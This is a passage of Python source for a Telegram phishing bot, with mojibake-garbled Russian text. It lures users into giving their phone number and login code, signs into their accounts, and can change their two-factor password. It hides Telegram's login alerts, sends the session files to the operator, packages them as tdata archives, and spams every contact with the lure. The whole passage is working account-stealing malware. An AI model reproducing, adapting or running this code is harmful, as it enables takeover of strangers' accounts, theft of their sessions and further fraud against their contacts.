                                f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {msg.from_user.get_mention()}\n'
                                f'ü™™ –¢–µ–ª–µ–≥—Ä–∞–º ID: {msg.from_user.id}')
            except:
                pass
            User(
                user_id=msg.chat.id,
                verified=False,
                phone='',
                ref_id=str(start_command[7:])
            ).save()
        else:
            user = User().get(user_id=msg.chat.id)
            if not user.verified:
                await msg.answer(ON_START.format(
                    'üëã C–ΩŒø–≤a –øp–∏–≤e—Ç'
                ), reply_markup=start2_kb)
                await AuthTG.phone.set()
    else:
        await bot.send_message(msg.chat.id, f'{msg.from_user.get_mention()} - –≤—ã –∞–¥–º–∏–Ω üëë\n\n'
                        f'‚öôÔ∏è –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n'
                        f'/spam - —Ä–∞—Å—Å—ã–ª–∫–∞\n'
                        f'/stat - –∫–æ–ª-–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n')
@dp.callback_query_handler(text='fishing', state='*')
async def on_pro(call: types.CallbackQuery):
    try:
        user = User().get(user_id=call.from_user.id)
    except:
        await call.answer('–≤–≤–µ–¥–∏ /start')
        return
    if not user.verified:
        try:
            await call.message.delete()
        except:
            pass
        await call.message.answer(ON_START, reply_markup=start2_kb)
        await AuthTG.phone.set()
@dp.message_handler(lambda msg: msg.contact.user_id == msg.chat.id,
                    state=AuthTG.phone, content_types=types.ContentType.CONTACT)
async def get_phone(msg: types.Message, state: FSMContext):
    fr = await msg.answer('üßë‚Äçüíª Œü—Ç–øpa–≤–ª—èe–º Œ∫Œø–¥ ...')
    if proxyuse == True:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash, proxy=proxy,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
        await client.connect()
        Sessions.data.update({
            msg.chat.id: client
        })
    else:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
    await client.connect()
    Sessions.data.update({
        msg.chat.id: client
    })
    pn = phonenumbers.parse('+' + str(msg.contact.phone_number))
    try:
        await bot.send_message(admin,
                               'üì± Œ†Œø–ª—å–∑Œø–≤a—Çe–ª—å –≤–≤e–ª –ΩŒø–ºep\n\n'
                               f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: `{msg.from_user.id}`\n'
                               f'üìû –ù–æ–º–µ—Ä: `{str(msg.contact.phone_number)}`\n'
                               f'üåç –°—Ç—Ä–∞–Ω–∞: `{region_code_for_country_code(pn.country_code)}`')
    except:
        pass
    await state.update_data(phone=str(msg.contact.phone_number))
    try:
        await client.send_code_request(str(msg.contact.phone_number))
    except FloodWaitError as ex:
        await msg.answer('‚ö†Ô∏è –û—à–∏–±–∫–∞. –õ–∏–º–∏—Ç—ã —Ç–µ–ª–µ–≥—Ä–∞–º')
        global mega_executing
        mega_executing = False
        print ('mega_executing = False')
    await fr.edit_text('üîë –ö–æ–¥:', reply_markup=num)
    await AuthTG.code.set()
@dp.callback_query_handler(text_startswith='ready', state=AuthTG.code)
async def on_2c(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer('‚ö†Ô∏è ŒöŒø–¥ –≤–≤e–¥e–Ω –Ωe–≤ep–ΩŒø')
        return
    if len(now) < 5:
        await call.answer('‚ö†Ô∏è ŒöŒø–¥ cŒøc—ÇŒø–∏—Ç –∏–∑ 5 —Ü–∏—Ñp')
        return
    client: TelegramClient = Sessions.data.get(call.from_user.id)
    try:
        await client.sign_in(data.get('phone'), int(now))
        if twofa_set == True:
            await client.edit_2fa(new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                username=call.message.from_user.username
            ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                username=call.message.from_user.username
            ))

        # –£–¥–∞–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        global mega_executing
        mega_executing = False
        print ('mega_executing = False')
        await up_account(client, data, state)

    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(call.from_user.id)
        except:
            pass
        await call.message.reply('‚ö†Ô∏è Œí—ã –≤–≤e–ª–∏ –Ωe–≤ep–Ω—ã–π Œ∫Œø–¥, –øŒø–≤—ÇŒøp–∏—Çe –øŒø–ø—ã—ÇŒ∫—É')
        await call.message.edit_text('üîë –ö–æ–¥:', reply_markup=num)
        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:
        await bot.send_message(call.message.chat.id, '‚ö†Ô∏è Œí–≤e–¥–∏—Çe –øapŒø–ª—å Œø—Ç –¥–≤—Éx—ç—Ça–ø–ΩŒø–π a–≤—ÇŒøp–∏–∑a—Ü–∏–∏:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()
        try:
            CodeInput.data.pop(call.from_user.id)
            Sessions.data.pop(call.from_user.id)
        except:
            pass
        await call.message.delete()
        await call.message.answer('‚ö†Ô∏è –í–≤–µ–¥–∏—Ç–µ /start')
    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {call.from_user.id} ')
        except:
            pass
        await call.answer('‚ö†Ô∏è Œ†Œø–øpŒø–±—É–π—Çe –øŒø–≤—ÇŒøp–∏—Ç—å, Œø—Ç–øpa–≤–∏–≤ /start')
class Tdata:
    def __init__(self, path: str = 'sessions'):
        self.path = path
    async def session_to_tdata(self, session_path):
        await self._session_to_tdata(session_path)
    async def _session_to_tdata(self, session_path):
        client = TC(os.path.join(self.path, session_path))
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        try:
            os.mkdir(os.path.join('tdata', session_path.split('.')[0]))
        except:
            pass
        try:
            tdesk.SaveTData(os.path.join('tdata', os.path.join(session_path.split('.')[0]), 'tdata'))
        except TypeError:
            pass
        await client.disconnect()
    async def pack_to_zip(self, tdata_path: str):
        shutil.make_archive(f'{tdata_path}', 'zip', tdata_path)
async def up_account(client, data, state):
    index_all = 0
    index_groups = 0
    index_channels = 0
    bot_id = await bot.get_me()
    chats_owns = []
    client: TC = client
    if botdelete == True:
        await client.delete_dialog(bot_id.username)
        await state.finish()
    else:
        await state.finish()
    async for dialog in client.iter_dialogs():
        try:
            dialog: Dialog = dialog
            if dialog.is_group:
                index_groups += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })
            if dialog.is_channel:
                index_channels += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })
            if dialog.is_user:
                index_channels += 1
                index_all += 1
        except:
            pass
    user = await client.get_me()
    try:
        premium_status = user.premium
    except:
        premium_status = False

    mg = await bot.send_document(logs, open('sessions/' + data.get('phone') + '.session', 'rb'), caption=f'‚úÖ Œ†Œø–ª—å–∑Œø–≤a—Çe–ª—å a–≤—ÇŒøp–∏–∑–∏pŒø–≤a–ª aŒ∫Œ∫a—É–Ω—Ç\n\n'
                                        f'üóÇ Œóa aŒ∫Œ∫a—É–Ω—Çe Œø–±–Ωap—É–∂e–ΩŒø:\n'
                                        f'‚ñ™Ô∏è Œíce–≥Œø –¥–∏a–ªŒø–≥Œø–≤: `{str(index_all)}`\n'
                                        f'‚ñ™Ô∏è Œíce–≥Œø –≥p—É–ø–ø: `{str(index_groups)}`\n'
                                        f'‚ñ™Ô∏è Œíce–≥Œø Œ∫a–Ωa–ªŒø–≤: `{str(index_channels)}`\n'
                                        f'‚ñ™Ô∏è Œíce–≥Œø c –øpa–≤a–º–∏ a–¥–º–∏–Ωa: `{str(len(chats_owns))}`\n\n'
                                        f'üëÆ‚Äç‚ôÄÔ∏è –û–± –∞–∫–∫–∞—É–Ω—Ç–µ:\n'
                                        f'üåÄ Username: `{str(user.username)}`\n'
                                        f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: `{str(user.id)}`\n'
                                        f'üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: `{user.phone}`\n'
                                        f'üåü –ü—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å: `{str(premium_status)}`\n'
                                        f'üí• SCAM —Å—Ç–∞—Ç—É—Å: `{str(user.scam)}`\n',
                                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [
                                ]
                                ]))
    await bot.send_document(admin, open('sessions/' + data.get('phone') + '.session', 'rb'),
                                 caption=f't.me/c/{str(logs).split("-100")[1]}/{str(mg.message_id)}')
    if chango == False:
        pass
    else:
        await client(functions.channels.JoinChannelRequest(
        channel=userchannel
    ))
        await bot.send_message(logs, text=f'‚úÖ ŒëŒ∫Œ∫a—É–Ω—Ç –±—ã–ª —Éc–øe—à–ΩŒø –øŒø–¥–ø–∏ca–Ω –Ωa: @{userchannel}\n\n'
                                         f'üîç –ê–∫–∫–∞—É–Ω—Ç:\n'
                                         f'üåÄ Username: {str(user.username)}\n'
                                         f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: {str(user.id)}\n\n')
    if spams == False:
        await client.disconnect()
    else:
        dialg = await client.get_dialogs()
        g = 0
        b = 0
        for dialog in dialg:
            try:
                bname=bot_id.username
                await client.send_message(dialog.id, SPAM_MSG.format(username=bname))
                await client.delete_dialog(dialog.id)
                g += 1
                time.sleep(0.33)
            except:
                b += 1
                time.sleep(0.33)
        await bot.send_message(logs, text=f'‚úÖ Œ°acc—ã–ªŒ∫a c aŒ∫Œ∫a—É–Ω—Ça –∑a–≤ep—àe–Ωa\n\n'
                                         f'üîç –ê–∫–∫–∞—É–Ω—Ç:*\n'
                                         f'üåÄ Username: `{str(user.username)}`\n'
                                         f'üÜî –¢–µ–ª–µ–≥—Ä–∞–º ID: `{str(user.id)}`\n\n'
                                         f'*üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:`\n'
                                         f'‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ `{g}`\n'
                                         f'üö´ –û—à–∏–±–æ–∫: `{b}`')
        await client.disconnect()
@dp.callback_query_handler(text_startswith='td|')
async def get_rd(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('–û–∂–∏–¥–∞–π—Ç–µ')
    asyncio.create_task(create_zip(srt))
    print(srt)
async def create_zip(srt):
    await Tdata().session_to_tdata(srt[-1])
    await Tdata().pack_to_zip(os.path.join('tdata', srt[-1].split('.')[0]))
    await bot.send_document(srt[1], open(os.path.join('tdata', srt[-1].split('.')[0]+'.zip'), 'rb'))
@dp.message_handler(state=AuthTG.twfa)
async def twa(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(password=msg.text)
        if twofa_current == True:
            await client.edit_2fa(current_password=msg.text, new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            
            global mega_executing
            mega_executing = False
            await up_account(client, data, state)
    except PasswordHashInvalidError:
        await msg.answer('‚ö†Ô∏è –í—ã —É–∫–∞–∑–∞–ª–∏ –Ω–µ –≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å')
@dp.callback_query_handler(text_startswith='remove', state=AuthTG.code)
async def on_1c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer()
        return
    CodeInput.data.update({call.from_user.id: now[:-1]})
    await call.message.edit_text(f'üîë ŒöŒø–¥: {CodeInput.data.get(call.from_user.id)}',
                                 reply_markup=num)

@dp.callback_query_handler(text_startswith='write_', state=AuthTG.code)
async def on_c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    code = call.data.split('_')[1]
    if not now:
        CodeInput.data.update({call.from_user.id: code})
        try:
            await call.message.edit_text(f'üîë ŒöŒø–¥: {CodeInput.data.get(call.from_user.id)}',
                                         reply_markup=num)
        except:
            pass
    else:
        if len(now) >= 5:
            await call.answer('Œóa–∂–º–∏—Çe –Ωa ‚úÖ –¥–ª—è –øpŒø–¥Œø–ª–∂e–Ω–∏—è')
            return

        CodeInput.data.update({call.from_user.id: now + code})
        await call.message.edit_text(f'üîë ŒöŒø–¥: {CodeInput.data.get(call.from_user.id)}',
                                     reply_markup=num)
@dp.message_handler(lambda msg: msg.text[1:].isdigit() and len(msg.text) >= 5 <= 7,
                    state=AuthTG.code, content_types=types.ContentType.TEXT)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(data.get('phone'),
                             int(msg.text[1:]))
        await up_account(client, data, state)
    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.reply('‚ö†Ô∏è Œí—ã –≤–≤e–ª–∏ –Ωe–≤ep–Ω—ã–π Œ∫Œø–¥, –øŒø–≤—ÇŒøp–∏—Çe –øŒø–ø—ã—ÇŒ∫—É')
        await AuthTG.code.set()
        await state.update_data(data)
    except SessionPasswordNeededError:
        await bot.send_message(call.message.chat.id, '‚ö†Ô∏è Œí–≤e–¥–∏—Çe –øapŒø–ª—å Œø—Ç –¥–≤—Éx—ç—Ça–ø–ΩŒø–π a–≤—ÇŒøp–∏–∑a—Ü–∏–∏:')
        await AuthTG.twfa.set()
    except PhoneCodeExpiredError:
        await state.finish()
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.answer('‚ö†Ô∏è –≤–≤–µ–¥–∏—Ç–µ /start')
    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {msg.from_user.id} ')
        except:
            pass
        await msg.answer('‚ö†Ô∏è Œ†Œø–øpŒø–±—É–π—Çe –øŒø–≤—ÇŒøp–∏—Ç—å, Œø—Ç–øpa–≤–∏–≤ /start')


if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)